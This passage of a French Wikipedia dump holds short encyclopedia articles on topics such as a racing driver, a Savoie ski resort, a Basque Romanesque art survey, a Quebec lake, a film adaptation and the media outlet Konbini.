Il remporte "l'United States Road Racing Championship" en 1966 sur McLaren-Elva Mark II (ainsi qu'antérieurement dans ce même championnat Laguna Seca en 1963, sur Lotus 23-Ford), inscrivant alors son nom au "Road America 500" à trois reprises consécutives de 1966 à 1968, les deux dernières grâce à l'écurie de Carl Haas. Il empoche au passage les de Kent en 1966, avec la McLaren.
Il participe sur Ferrari aux 24 Heures du Mans en 1967 et 1970 (alors dixième sous la pluie avec son compatriote et troisième de catégorie S3L. pour le "North American Racing Team").
En 1969 il remporte sa plus belle victoire aux 24 Heures de Daytona -en remplaçant alors un pilote indisponible au pied levé- pour le Penske Racing avec Mark Donohue sur Lola T70 Coupé, et il termine aussi troisième du championnat CanAm avec 81 points, sur Lola T162-Chevrolet du "Carl Haas Racing Team" (derrière McLaren et Hulme, effectuant un total de sept saisons consécutives dans ce championnat entre 1966 et 1972 en totalisant 145 points, se classant huitième des pilotes ayant obtenu le plus de résultats dans la compétition nord-américaine (en y terminant sa carrière encore à Riverside, sur une McLaren).
Il lui a aussi été donné de courir sur Formule 5000, et de participer à une course de championnat USAC au "Riverside International Raceway" à la fin des années 1960.

</doc>
<doc id="8730573" url="https://fr.wikipedia.org/wiki?curid=8730573" title="Le Désert d'Entremont">
Le Désert d'Entremont

Le Désert d'Entremont est une station de sports d'hiver de France située en Savoie, dans le massif de la Chartreuse, sur la commune d'Entremont-le-Vieux, au sud de Chambéry, au pied du mont Outheran.
La commune accueille également le Granier, une autre station de sports d'hiver, sur le versant opposé, au pied du mont Granier.
Géographie.
La station du Désert d'Entremont est située dans le nord-est du massif de la Chartreuse, dominée par le mont Outheran situé au nord-ouest, face au mont Granier. Située entre d'altitude, elle comporte trois téléskis desservant sept pistes.
L'espace nordique est situé juste au nord du domaine alpin, sur l'adret du col du Mollard, et comporte plusieurs pistes et itinéraires de ski de fond et de randonnée à raquettes.
Elle est accessible par la route départementale 45 à partir de Saint-Jean-de-Couz via Corbel ou d'Entremont-le-Vieux.
Histoire.
Le développement du ski dans la vallée des Entremonts se développe à partir de 1968 avec la mise en place du foyer de ski de fond.
Hébergement et restauration.
En 2014, la capacité d'accueil de la station, estimée par l'organisme Savoie Mont Blanc, est de répartis dans . Les hébergements se répartissent comme suit : ; ; ou gîtes d'étape et une chambre d'hôtes.
La capacité de la commune d'Entremont-le-Vieux est de répartis dans . Pour la commune voisine de Corbel, les proposent .
Exploitation.
La station de ski est gérée depuis 1972 par la société anonyme d'Aménagement du Désert d'Entremont.
En hiver, avec présence de neige, on peut y pratiquer le ski alpin, le snowboard et la luge.
Le forfait de ski est commun au Désert d'Entremont et au Granier.

</doc>
<doc id="8730578" url="https://fr.wikipedia.org/wiki?curid=8730578" title="Cible émouvante (roman)">
Cible émouvante (roman)

Cible émouvante ("") est un roman policier de l’écrivain australien Carter Brown publié en 1960 en Australie et aux États-Unis. Le livre paraît en France en 1960 dans la Série noire. La traduction, prétendument "de l'américain", est signée Janine Hérisson. C'est une des nombreuses aventures du lieutenant Al Wheeler, bras droit du shérif Lavers dans la ville californienne fictive de "Pine City" - la douzième traduite en français aux Éditions Gallimard. Le héros est aussi le narrateur.
Résumé.
Mrs. Geoffroy Summers arrive tout droit de New-York à "Pine City", avec son arrogance, son beau-frère et son avocate, pour exiger du shérif Lavers qu'il arrête un minable chanteur de "Greenwich Village" qui a osé s'enfuir avec sa fille, Angela Summers, pas tout à fait majeure. Selon le détective privé qu'elle a payé, les deux tourtereaux se trouvent dans le motel "Le repos des voyageurs". Al Wheeler a de l'avance : il vient justement de trouver le corps dudit détective au même motel, le crâne fracassé à coups de marteau. Du coup, l'enquête prend une autre dimension, surtout que le jeune couple a disparu, que le chanteur séducteur s'avère être un repris de justice dont le frère dirige, à "Pine City", un club privé tout à fait illégal.

</doc>
<doc id="8730587" url="https://fr.wikipedia.org/wiki?curid=8730587" title="Bernard Nivelt">
Bernard Nivelt



</doc>
<doc id="8730591" url="https://fr.wikipedia.org/wiki?curid=8730591" title="Open d'Argentine (taekwondo)">
Open d'Argentine (taekwondo)

L’Open d'Argentine est une compétition de taekwondo organisée annuellement par la Fédération dominicaine de taekwondo.
Ce tournoi est un événement majeur dans le calendrier mondial du fait de son label « WTF-G1 ».

</doc>
<doc id="8730595" url="https://fr.wikipedia.org/wiki?curid=8730595" title="Jeffrey Wammes">
Jeffrey Wammes

Jeffrey Wammes, né le à Utrecht, est un gymnaste hollandais, spécialiste des activités au sol et du saut de cheval.
Biographie.
Jeffrey Wammes est né en 1987 à Utrecht, d'origines néerlandaises, antillaises et surinamaises. 
Carrière sportive.
Il représente son pays depuis 2005, remportant plusieurs Coupes du monde de gymnastique. Il est notamment champion au saut de cheval à Gand en 2010.
Il est membre de l'association gymnastique de Bois-le-Duc.
Activités annexes.
En plus de son activité compétitive, Wammes est ambassadeur d'une organisation humanitaire promouvant le sport chez les enfants démunis, et est apparu dans des émissions télévisées hollandaises, telles que le spectacle de plongée "Sterren Springen".
Vie privée.
En 2011, le gymnaste fait son coming out dans un numéro hors-série du magazine "Linda".

</doc>
<doc id="8730602" url="https://fr.wikipedia.org/wiki?curid=8730602" title="Genévrier oxycèdre">
Genévrier oxycèdre



</doc>
<doc id="8730606" url="https://fr.wikipedia.org/wiki?curid=8730606" title="Suzuki Kei">
Suzuki Kei

La Kei est une voiture, appartenant à la catégorie keijidōsha, du constructeur automobile japonais Suzuki produite entre 1998 et 2009.
De 1999 à 2006, Suzuki a produit le Mazda Laputa, une version OEM de la Suzuki Kei.

</doc>
<doc id="8730609" url="https://fr.wikipedia.org/wiki?curid=8730609" title="Art roman en Pays basque">
Art roman en Pays basque

L'art roman en Pays basque est présent à travers les sept provinces qui composent ce territoire, avec une prédominance en Navarre et Alava.
Comme dans la plupart des sites romans d'Europe, l'art roman est, en Pays basque, intimement lié au chemin de Saint-Jacques.
Le concept de « Premier Art Roman » est développé par Puig i Cadafalch, qui l'a initialement appliqué à certaines églises catalanes avant que ce terme ne soit étendu à l'architecture romane en général. Puig i Cadafalch a d'abord publié ses idées en catalan, puis en espagnol, dans des ouvrages majeurs tels que "L'Architecture romane en Catalogne" et "Le Premier Art Roman". Il analyse les influences variées reçues par les architectes catalans, notamment celles de l'Italie, du Languedoc, de Cluny, et de l'Espagne musulmane, tout en décrivant les différences stylistiques des églises chrétiennes de la région.
Les caractéristiques du « Premier Art Roman » incluent l'utilisation de pierres grossières pour les murs, souvent découpées à l'aide d'outils simples et disposées en "opus spicatum", des espaces intérieurs à voûtes en berceau et l'absence de sculptures décoratives. À partir du , le style lombard, influencé par l'Italie du Nord, commence à se manifester, notamment dans les arcs extérieurs décorés de bandes et de motifs.
L'architecture romane du nord de l'Espagne, particulièrement en Catalogne, marque une rupture avec les anciennes formules mozarabes, en introduisant de nouvelles structures et ornements, notamment des arcs profilés et des éléments décoratifs comme les colonnes torsadées et les absides sculptées. L'influence lombarde se répand dans toute l'Europe, de l'Italie à la France, en passant par la Catalogne et la Suisse.
Noms des Saints au Pays basque.
L'élaboration d'un répertoire de noms de saints en basque remonte au début du , avec Sabino Arana et Luis Eleizalde, qui ont créé des prénoms originaux (Josu, Jon, Miren...) faute de sources anciennes. Bien intégrés, ces noms n'ont toutefois pas remplacé les formes traditionnelles religieuses (Jesu Kristo, Ama Birjina...). "Euskaltzaindia" a donc entrepris de formaliser ces noms en basque. Tirés de la Bible et de la tradition chrétienne, ces noms d'origine variée ont évolué différemment selon les langues, donnant par exemple Pierre, Pedro, Peter, etc. ou en basque Petri à partir du latin "Petrus".
Depuis longtemps, les noms de saints et de saintes ont été adaptés à la phonétique basque, surtout ceux enracinés dans la tradition populaire. Après le Concile de Trente (1545), l'Église a imposé les formes officielles dans les langues d'État, reléguant les formes basques au second plan, souvent associées à des milieux peu instruits. Cela a conduit à une prédominance des noms en espagnol ou en français dans les archives et documents, éclipsant les formes basques. Pourtant, des traces de ces noms anciens subsistent dans la toponymie et la tradition orale. Depuis que le basque est devenu langue officielle, un besoin de normalisation s'est fait sentir, notamment pour les noms de saints. L'Académie de la langue basque ("Euskaltzaindia") a donc publié une liste de noms adaptés à l'orthographe actuelle. Certains noms sont valables pour les deux genres, d'autres ont une forme masculine ou féminine. On y trouve aussi des formes locales ou affectives, ainsi que des noms issus de toponymes liés à la Vierge.
Fixation des noms de saints en basque.
Pour fixer les noms de saints en basque, "Euskaltzaindia" se base sur la tradition linguistique basque en privilégiant les formes anciennes attestées dans les textes, les toponymes, et les patronymes. Par exemple :
Les formes les plus répandues et reconnaissables sont privilégiées, comme par exemple :
Les formes dialectales ou diminutives comme "Pello", "Beñat", "Txanton", "Ganix"" ne sont pas des modèles officiels mais peuvent être utilisées comme prénoms.
Règles d'orthographe.
Les règles d'orthographe suivantes sont appliquées : c devient k : ""Karlos", "Katalina", v reste dans certains noms historiques : "Valentin", "Veronika". Les noms se terminant par -us en latin deviennent -o en basque : "Martzelo", "Zeltso". Les noms se terminant par -os en grec deviennent -o en basque : "Teodoro", "Nartziso".
Si aucune tradition claire n'existe, on s'appuie sur les formes les plus répandues en Europe. Par exemple : "Baltasar" (vs Balthazar), "Filipe" (vs Felipe, Philippe), "Hiazinto" (vs Jacinto, Hyacinthe).
Mais pour les formes traditionnelles : "Jakue" (au lieu de Jacques), "Gilen" (au lieu de Guillaume), "Jurgi" (au lieu de Georges), "Justi"" (au lieu de Juste).
Guipuscoa.
Le patrimoine roman du Guipuscoa est disséminé à travers quatre de ses régions :
Biscaye.
Les quelques exemples d'art roman en Biscaye se retrouvent principalement en Mungialdea :
Une chapelle romane est cependant présente dans le Grand Bilbao, la chapelle San Pedro d'Abrisketa à Arrigorriaga.
Navarre.
Plusieurs églises romanes de Navarre (Lepuzáin (Mendibil), Amunarrizqueta, Iriberri, Uzquita, Benegorri, Bézquiz et Donamaría) sont aujourd'hui en ruines ou en très mauvais état. Construites aux s, elles présentent généralement des nefs uniques, des absides rectangulaires ou semi-circulaires, et des portails simples. Certaines conservent encore des éléments notables comme des tours, des chapiteaux sculptés ou des fonts baptismaux, souvent déplacés. Leurs états actuels témoignent d'un abandon progressif malgré leur valeur historique.

</doc>
<doc id="8730617" url="https://fr.wikipedia.org/wiki?curid=8730617" title="Väski">
Väski

Väski est une île de l'archipel finlandais à Naantali en Finlande.
Géographie.
Elle appartient à la municipalité de Naantali et est occupé par un parc d'attraction destiné à l'école primaire sur le thème des pirates. personnes l'ont visitée en 2009.
Transports.
L'été, l'île est desservie par deux traversiers qui partent de la vieille ville de Naantali: le M/S Rosita qui accueille 100 passagers et le M/S Kymppi qui accepte 80 passagers.
Histoire.
Une série de MTV3, "Aarresaaren sankarit" y a été tournée en 2003.
Voir aussi.
Lien externe.
Vue satellite

</doc>
<doc id="8730623" url="https://fr.wikipedia.org/wiki?curid=8730623" title="Service militaire obligatoire">
Service militaire obligatoire



</doc>
<doc id="8730627" url="https://fr.wikipedia.org/wiki?curid=8730627" title="Nissewaard">
Nissewaard

Nissewaard est une commune néerlandaise située sur l'île de Voorne-Putten, dans le sud de la province de Hollande-Méridionale. La commune est créée le par la fusion des communes de Spijkenisse et Bernisse, et comprend l'ensemble de l'île de Putten et l'est de l'île de Voorne.
Les conseils municipaux de Spijkenisse et Bernisse décident en d'utiliser le nom « Nissewaard » pour la nouvelle commune. Le nouveau conseil municipal régissant Nissewaard est élu le .
La nouvelle commune compte environ et couvre une superficie de (dont d'eau).
Politique et administration.
Conseil communal.
Le conseil communal de Nissewaard est actuellement constitué de 37 sièges.

</doc>
<doc id="8730633" url="https://fr.wikipedia.org/wiki?curid=8730633" title="John Zorn’s Olympiad - Vol. 1 Dither Plays Zorn">
John Zorn’s Olympiad - Vol. 1 Dither Plays Zorn

 se présente comme le premier volume d'une série qui porte sur les "game pieces", des pièces composées par John Zorn à la fin des années 1970 et au début des années 1980 ("Curling" est de 1977, "Hockey" et "Fencing" de 1978). Les "game pieces" sont en fait un ensemble de règles de structures qui encadrent et définissent les modalités de l'improvisation. Il n'y a pas de contenu musical écrit ou prédéfini. À cette époque, John Zorn présentait annuellement des prestations, qu'il qualifiait d’"Olympiades", au cours desquelles ces pièces, qui portent toutes des noms de sports, étaient jouées. Si "Hockey" a déjà été enregistrée, il s'agit des premiers enregistrements de "Curling" et de "Fencing".

</doc>
<doc id="8730646" url="https://fr.wikipedia.org/wiki?curid=8730646" title="Cible émouvante">
Cible émouvante

Cible émouvante peut faire référence à :

</doc>
<doc id="8730667" url="https://fr.wikipedia.org/wiki?curid=8730667" title="Austin A40 Farina">
Austin A40 Farina



</doc>
<doc id="8730668" url="https://fr.wikipedia.org/wiki?curid=8730668" title="Lac des Trente et Un Milles">
Lac des Trente et Un Milles

Le lac des Trente et Un Milles est un plan d'eau douce situé entre les régions de l'Outaouais et des Laurentides au Québec au Canada. En fait, son étendue se partage entre quatre municipalités :Déléage Sainte-Thérèse-de-la-Gatineau et Bouchette à l'ouest, Notre-Dame-de-Pontmain à l'est ainsi que Gracefield au sud. Le territoire autour du lac est forestier et montagneux.
Toponymie.
L'origine de cette appellation demeure inexpliquée. Ni la longueur du lac, qui est de , ni sa distance par rapport à un point de repère régional significatif ne correspondent à .
Au cours de son histoire, le lac des Trente et Un Milles a connu plusieurs appellations. En 1863, Stanislas Drapeau désigne ce plan d'eau "Grand Lac" en spécifiant que sa longueur est de (). Dans son rapport d'arpentage daté du , Sam. B. Lucas, le désigne également sous le nom de Grand-Lac. En 1889, l'arpenteur John O'Sullivan y décrivait les caractéristiques ce plan d'eau dans un de ses rapports. En 1908, le nom "Grand Lac du Commissaire ou 31 Milles" est utilisé sur la carte du canton de Cameron. En 1925, le géographe Eugène Rouillard désigne ce plan d'eau sous le nom de "lac du Commissaire". Plus tard, ce plan d'eau a été désigné en tant que "lac Papenegoegawong".
Géographie.
En lignes directes, le lac des Trente et Un Milles est situé à à l'est de la rivière Gatineau, à à l'est du village de Gracefield, à au nord du village de Wakefield, à au nord du centre-ville de Gatineau et à au sud-dest du centre-ville de Maniwaki. Sa superficie est répartie entre quatre municipalités : Sainte-Thérèse-de-la-Gatineau et Bouchette à l'ouest, Notre-Dame-de-Pontmain à l'est ainsi que Gracefield au sud.
Le lac s'étend sur une longueur de dans le sens nord–sud et atteint une profondeur de .
Hydrographie.
Le lac des Trente et Un Milles est alimenté par les cours d'eau suivant :
Histoire.
En 1895, des pêcheurs y pratiquaient la pêche commerciale afin d'approvisionner le marché d'Ottawa et Hull en poisson blanc, truite grise, achigan et brochet. Dès le début du , la villégiature a été mise en valeur, grâce à l'attrait de ses baies pittoresques et ses îles sauvages, ainsi que grâce à la pêche et à la chasse.
Barrage.
À l'embouchure sur le rive ouest du lac des Trente et Un Milles, un barrage en béton a été érigé en 1978, puis modifié en 2009. Il est situé près des îles Laflamme, Sèches et à Pépère, dans le territoire de Sainte-Thérèse-de-la-Gatineau. D'une longueur de , ce barrage a une hauteur de et une hauteur de retenue de . Il retient les eaux d'un réservoir de . Il est la propriété du Centre d'expertise hydrique du Québec.
À partir du barrage, le courant coule vers l'ouest, puis vers le sud, en traversant, sur , le lac Michel. Le courant traverse, vers le sud, le rapide Plat, le lac la Vieille sur et la chute Rouge avant d'aboutir sur la rive nord du Petit lac Rond. Le courant le traverse sur vers le sud, puis vers l'ouest. Le courant emprunte une courte décharge avant de se déverser dans le lac Roddick qu'il traverse sur jusqu'à un court détroit. Puis, le courant traverse le Grand lac Rond sur vers l'ouest en contournant la presqu'île des Lyrette. Enfin, le courant franchit un dernier segment de vers l'ouest pour aller se déverser dans la rivière Gatineau.
Activités.
La glace permet des activités d'hiver telles la conduite de motoneiges et de quads, le ski de fond et la raquette, ainsi que la pêche sur la glace. En été, la navigation de plaisance, les plages et les nombreuses îles sauvages font la renommée de ce lac.

</doc>
<doc id="8730673" url="https://fr.wikipedia.org/wiki?curid=8730673" title="Le client a toujours raison">
Le client a toujours raison

« Le client a toujours raison » ("" en anglais) est une maxime, une devise et un slogan populaires dans le domaine commercial. La phrase incite les commerçants à prioriser la satisfaction de la clientèle.
Elle a été popularisée d'abord dans le commerce de détail à la fin du par des personnalités telles Harry Gordon Selfridge, John Wanamaker et Marshall Field. Ces derniers priorisaient la satisfaction du consommateur en traitant sérieusement les doléances de ce dernier afin qu'il ne se sente pas floué. Cette attitude a marqué un changement dans l'approche client à une époque où la fausse représentation était courante et où la maxime "caveat emptor" (« que l'acheteur soit vigilant ») était répandue.
Cependant, les limites du slogan, qui ne tient pas compte que le consommateur peut être malhonnête et peut avoir des attentes irréalistes envers le produit, sont mises en évidence dès 1914. L'auteur reprend les mêmes idées un an plus tard dans un autre article.
Variations.
Il existe certaines variations de la maxime telles que « le client n'a jamais tort », attribuée à l'hôtelier César Ritz. En Allemagne, la forme "" (« le client est roi ») est souvent employée.
Critiques.
De nombreuses critiques ont été exprimées face au véritable pouvoir des consommateurs sur l'offre. L'économiste John Kenneth Galbraith tente de démontrer par la notion de filière inversée que les entreprises sont capables de contrôler leurs débouchés notamment par des stratégies de commercialisation et de fidélisation ; ainsi ce sont les entreprises qui imposent leurs produits aux clients, et non l'inverse.

</doc>
<doc id="8730680" url="https://fr.wikipedia.org/wiki?curid=8730680" title="Enzyme coiffante">
Enzyme coiffante

L'enzyme coiffante est un complexe enzymatique constitué d'une phosphatase, d'une nucléotidyltransférase et d'une méthyltransférase, qui catalyse les réactions :
Ces réactions consistent successivement en l'hydrolyse du phosphate γ du nucléotide 5’ terminal du transcrit primaire par l'ARN triphosphatase, puis le transfert sur le phosphate β restant d'un guanylate à partir d'une molécule de GTP par l'ARNm guanylyltransférase, et enfin la méthylation de ce guanylate sur l'atome d'azote 7 par l'ARNm méthyltransférase. Les deux premières activités enzymatiques sont réalisées par une sous-unité protéique de tandis que la méthylation du résidu de guanosine est réalisée par une sous-unité de .
Cette multienzyme attache la coiffe à l'extrémité 5' de l'ARN messager produit dans le noyau cellulaire aux premières étapes de l'expression des gènes. Cette réaction se déroule au cours de la transcription à partir du moment où l'ARN messager en croissance contient à peine . Elle est catalysée spécifiquement par le domaine phosphorylé de l'ARN polymérase II, de sorte que cette coiffe est caractéristique des ARN messagers produits par cette ARN polymérase à l'exclusion de l'ARN polymérase I et de l'ARN polymérase III. Outre l'adjonction d'une coiffe, l'ARN messager subit par la suite d'autres transformations telles que l'épissage et la polyadénylation, qui constituent la maturation de l'ARN messager.
L'enzyme coiffante n'est active que lorsqu'elle est attachée à l'ARN polymérase II, enzyme nécessaire à la transcription de l'ADN en ARN prémessager.

</doc>
<doc id="8730692" url="https://fr.wikipedia.org/wiki?curid=8730692" title="Orgueil et Préjugés et Zombies (film)">
Orgueil et Préjugés et Zombies (film)

Orgueil et Préjugés et Zombies ("") est une comédie horrifique américano-britannique réalisée par Burr Steers et sortie en 2016. Il s'agit d'une adaptation du roman parodique "Orgueil et Préjugés et Zombies" de Seth Grahame-Smith, lui-même inspiré du roman de Jane Austen.
Synopsis.
Depuis une cinquantaine d'années, l'Angleterre subit une mystérieuse épidémie entraînant une invasion de zombies. L'arrivée de deux jeunes et riches célibataires dans le voisinage réjouit la famille Bennet, qui compte cinq filles à marier.
Résumé complet
Au début du XIXe siècle, l'Angleterre est assiégée par des zombies. Les sœurs Bennet, Elizabeth, Jane, Kitty, Lydia et Mary, ont toutes été formées à l'art des armes et des arts martiaux en Chine, à la demande de leur père, afin de pouvoir se défendre. Mme Bennet ne souhaite voir ses filles mariées qu'à de riches prétendants. Les Bennet assistent à un bal de campagne auquel participent également le colonel Darcy, son bon ami l'aimable Charles Bingley et la sœur snob de ce dernier, Caroline. Là, le jeune et beau Bingley tombe amoureux de la belle et douce Jane. Charles Bingley a hérité de 100 000 £ (8,2 millions de £ aujourd'hui), ce qui attire l'attention de Mme Bennet en tant que prétendant désirable pour sa fille. Lorsque des zombies attaquent le bal, les sœurs Bennet les repoussent et le colonel Darcy, un tueur de zombies expérimenté qui a été formé aux arts martiaux japonais – avec une propriété qui lui rapporte 10 000 £ par an (820 000 £ aujourd'hui) – devient attiré par Elizabeth après avoir vu ses talents de combattante, bien que son comportement soit extérieurement distant. Pendant le bal, Darcy est dégoûté d'entendre la joie mercenaire de Mme Bennet selon laquelle Jane a attiré un homme riche. Sur le chemin des Bingley quelques jours plus tard, Jane est attaquée par un zombie et attrape une fièvre. Darcy ordonne qu'elle soit enfermée de peur qu'elle ait été mordue, mais sa maladie n'est pas liée aux zombies et elle se rétablit.
Les Bennet reçoivent la visite d'un cousin, le pasteur Collins autoritaire, qui, en tant que seul héritier mâle survivant de la famille, héritera de la maison Bennet à la mort de M. Bennet. Collins propose à Elizabeth de l'épouser mais déclare qu'elle doit renoncer à sa vie de guerrière, ce qu'elle refuse de faire. Elizabeth rencontre un charmant soldat nommé George Wickham et lui donne rendez-vous à un autre bal. Elle se rend avec lui dans une église remplie de zombies qui se nourrissent de cerveaux de porcs au lieu de cerveaux humains, gardant leur comportement relativement normal. Wickham croit que les humains peuvent coexister avec ces nouveaux zombies « civilisés ». Il informe Elizabeth que Darcy a convaincu les Bingley de quitter le comté pour éloigner Bingley de Jane et lui demande ensuite de s'enfuir avec lui, mais elle refuse. Lorsque Darcy propose sa main à Elizabeth, étant tombé amoureux d'elle malgré sa froideur apparente, elle exprime son indignation face à ses actions concernant Jane et se bat contre lui.
Darcy écrit plus tard une lettre d'excuses à Elizabeth. Il regrette d'avoir séparé Jane et Bingley, craignant que Jane ne veuille épouser Bingley que pour sa richesse. Il expose également la vraie nature de Wickham. Lui et Wickham étaient amis d'enfance, mais Wickham a peut-être assassiné le père de Darcy, dilapidé son héritage et essayé d'obtenir de l'argent supplémentaire de la succession de Darcy. Lorsque cela échoue, Wickham essaie de s'enfuir avec la jeune sœur de Darcy, Georgiana, pour sa fortune. Elizabeth apprend que Wickham s'est enfui avec Lydia et que Londres a été envahie par des zombies. Darcy sauve Lydia et apprend que Wickham utilise les zombies « civilisés » pour créer une armée de zombies, qui a envahi Londres selon le plan de Wickham pour diriger le pays. Il l'arrête en donnant aux zombies des cerveaux humains, ce qui les rend sauvages.
Pendant le combat, Darcy poignarde Wickham dans la poitrine, révélant qu'il était mort-vivant depuis le début, comme les autres zombies soi-disant apprivoisés. Elizabeth sauve Darcy d'être tué par Wickham, qui s'échappe (bien qu'Elizabeth lui ait coupé le bras droit). Alors que les deux traversent un pont, l'armée humaine le détruit pour empêcher les zombies de traverser depuis Londres. Darcy est blessé dans l'explosion, et Elizabeth avoue en larmes son amour pour lui. Après que Darcy se soit rétabli, il demande à nouveau Elizabeth en mariage, et cette fois, elle accepte. Les deux ont un mariage commun avec Bingley et Jane. Dans une scène de mi-crédit, Wickham arrive avec son armée de zombies pour faire irruption au mariage, laissant le sort de tout le monde inconnu.
Production.
Développement et genèse.
Un projet de film tiré du roman parodique "Orgueil et Préjugés et Zombies" de Seth Grahame-Smith est annoncé dès décembre 2009, financé par Lions Gate Film, avec Natalie Portman dans le rôle d'Elizabeth et à la production, et David O. Russell comme scénariste et réalisateur. Mais en octobre 2010 Russell abandonne le projet et Natalie Portman le rôle (mais pas la production). Mike Newell et Matt Reeves refusent de prendre la relève de Russell. Scarlett Johansson est contactée pour tenir le rôle d'Elizabeth et Mike White est embauché le 5 novembre, mais ce dernier doit partir dès janvier 2011, un engagement préexistant chez HBO entrainant un conflit d'emploi du temps.
En février 2011 la réalisation est confiée à Craig Gillespie. Le projet l'intéresse à cause du mélange des genres (mashup). En mai 2011, Marti Noxon est embauchée pour réécrire le scénario de Russell. Mais en octobre on apprend que Gillespie a abandonné le projet.
Ce n'est qu'en mars 2013 qu'il est remis sur les rails, avec l'arrivée de la société de production Panorama Media. En mai, on annonce que Burr Steers va reprendre la réalisation. Burr Steers reprend aussi le scénario, disant qu'il y avait remis (tout ce qui fait "Orgueil et Préjugés" : humour, critique sociétale...).
Tournage.
Le tournage débute enfin le dans le Buckinghamshire à West Wycombe Park. Pendant le week-end d'Halloween, des scènes sont tournées à Hatfield House, dans le Hertfordshire. Puis les équipes se déplacent dans le Surrey en novembre.
Accueil.
Sorties internationales.
Le , Screen Gems annonce que le film sortira aux États-Unis pour le , puis, en prévoit finalement la sortie pour le .

</doc>
<doc id="8730695" url="https://fr.wikipedia.org/wiki?curid=8730695" title="France Leplat">
France Leplat

France Leplat, née le à Tourcoing et décédée le à Versailles, est une peintre du début du . On l'associe au courant de l'école de Paris.
Biographie.
France Leplat est née le 15 décembre 1895 à Tourcoing. 
Elle étudie à l’Ecole des Beaux-Arts de Lille de 1913 à 1918; elle y obtient le premier prix de sculpture et le premier prix de peinture. En 1919, elle s’installe à Paris, à la cité d'artistes La Ruche.
Longtemps oubliée elle est redécouverte au début des années 2000. A l'occasion d'une vente de ses tableaux à Paris, une exposition lui est consacrée au musée du Montparnasse en 2008.

</doc>
<doc id="8730700" url="https://fr.wikipedia.org/wiki?curid=8730700" title="Doré de Lathuy">
Doré de Lathuy

Le Doré de Lathuy est un fromage artisanal biologique au lait cru à pâte molle.
Nom.
Le Doré de Lathuy provient du village de Lathuy où se trouvait la fromagerie "Bioferme" avant son rachat par la "fromagerie des Ardennes". Ce fromage est actuellement produit à Werbomont au cœur des Ardennes en Belgique, dans la province de Liège.
Description.
Ce fromage a la forme d’un cylindre plat de douze centimètres de diamètre et de trois centimètres d’épaisseur. Son poids est d’environ trois cents grammes. Sa croûte est de couleur jaune safran recouverte d’un fin duvet blanc. Sa pâte, onctueuse et souple, est de couleur jaune. De saveur fruitée, il dégage une odeur de champignon et de crème et laisse un arrière-goût de noisette
Distinctions.
En 2001, il a obtenu le « Coq de Cristal » à la foire agricole de Libramont.
En 2013, au concours de fromages de Harzé, il est arrivé en deuxième position.

</doc>
<doc id="8730713" url="https://fr.wikipedia.org/wiki?curid=8730713" title="Larmes de reine">
Larmes de reine

Larmes de reine, ou Les Larmes de la reine ("") est un film américain réalisé par Allan Dwan, sorti en 1924. 

</doc>
<doc id="8730720" url="https://fr.wikipedia.org/wiki?curid=8730720" title="SK Kountsevo">
SK Kountsevo

Le SK Kountsevo est un club de handball russe qui se situe à Kountsevo, un ancien village intégré à la municipalité de Moscou en 1960.

</doc>
<doc id="8730723" url="https://fr.wikipedia.org/wiki?curid=8730723" title="John Livingston (écrivain)">
John Livingston (écrivain)



</doc>
<doc id="8730732" url="https://fr.wikipedia.org/wiki?curid=8730732" title="Sportunion Edelweiss Linz">
Sportunion Edelweiss Linz

Le Sportunion Edelweiss Linz est un club de handball situé à Linz en Autriche.

</doc>
<doc id="8730735" url="https://fr.wikipedia.org/wiki?curid=8730735" title="Konbini (site web)">
Konbini (site web)

Konbini est un média en ligne français fondé à Paris en 2008 par David Creuzot et Lucie Beudet.
La stratégie de "Konbini" repose sur une présence importante sur les réseaux sociaux ; les jeunes âgés de sont sa principale cible. L'entreprise se finance principalement par différentes méthodes dérivées du publirédactionnel, notamment le marketing de contenu et le "native advertising".
Le capital de "Konbini" est détenu majoritairement par la famille Perrodo jusqu'à son rachat à 100 % en 2024 par DC Company, l’éditeur du "Gorafi".
Nom.
Le nom du média est un clin d'oeil au "konbini" japonais, magasin de proximité ouvert sur 24.
Historique.
Fondation et actionnariat.
En 1997, les deux fondateurs du site, David Creuzot et Lucie Beudet, ont créé et travaillé ensemble au sein de l'agence digitale Pekin ; cette dernière fusionne en 2006 avec La Chose. En , ils lèvent et créent le site "Konbini", auprès de NextStage AM et notamment de son président Grégoire Sentilhes. Ils appellent Mathieu Marmouget à la direction générale, avec qui ils avaient collaboré à des campagnes innovantes pour Orange. Les fondateurs s'inspirent du modèle d'Acne Studios, agence de communication suédoise qui s'est diversifiée dans plusieurs activités, notamment la production de films, la publication d'un magazine et la création de vêtements, cette dernière activité ayant par la suite donné lieu à la création d'une structure dédiée. Le site produit des vidéos abordant des sujets aussi variés que la musique, la mode, la culture populaire entendue au sens large ou même la politique et des thèmes sociaux d'actualité. La ligne éditoriale est proche de celle de sites comme "BuzzFeed".
En 2009, l'entreprise opère à nouveau une levée de fonds de d'euros auprès de NextStage, afin de renforcer son développement et de lancer une version anglaise du site. En 2012, l'entreprise est rentable et son chiffre d'affaires s'élève à d'euros.
"La Lettre A" indique en 2019 que la famille Perrodo est l' de "Konbini". La famille détient le média à travers : une holding luxembourgeoise dénommée Ommirep, elle-même détenue par trois sociétés immatriculées aux Bahamas. L’article revenait également sur les relations d’affaires entre les fondateurs du média et Stéphane Richard, alors PDG d’Orange. Selon "Capital", la discrétion de cet investissement réalisé « de manière opaque, via une holding luxembourgeoise » « s’explique peut-être par la réputation controversée de cette famille, en raison de leur utilisation des paradis fiscaux et d’accusations de corruption ».
À partir de juillet 2023, Marjorie du Manoir est directrice de la rédaction du média en ligne.
En 2022, la famille Perrodo réinjecte trois millions d’euros supplémentaires dans le site de « vidéos lifestyle », portant leur participation à 80,8 % ce qui porte leur investissement à un total de 46 millions d’euros. Ces apports de fonds étaient nécessaires en raison des pertes de la société, qui a cumulé 27,3 millions d’euros de déficits entre 2018 et 2020. Des sommes relativement importantes, selon "Capital", « au regard du chiffre d’affaires: environ 13 millions d’euros en 2020, à peu près autant qu’en 2019. ».
Présence sur les médias sociaux.
En , "Konbini" se lance sur Snapchat via la fonctionnalité « Discover » en France. "Konbini" est en 2019 l'un des seuls médias en Europe à avoir accès aux trois formats Snapchat qui sont "Discover", "Shows" et "Curated".
L'entreprise se finance principalement par différentes méthodes dérivées du publirédactionnel, comme le marketing de contenu ou le "native advertising". Certains contenus publiés par "Konbini" sont en partie co-produits pour des marques comme Coca-Cola, Netflix ou L'Oréal. Sur son site internet, "Konbini" entretient une communication transparente quant à l'origine du "brand content" grâce à la présence de logo signalant les publications créées en partenariat avec des marques.
Selon "alloweb", "Konbini" se finance principalement par des levées de fonds.
"Konbini" est partenaire de "Disclose" depuis 2018.
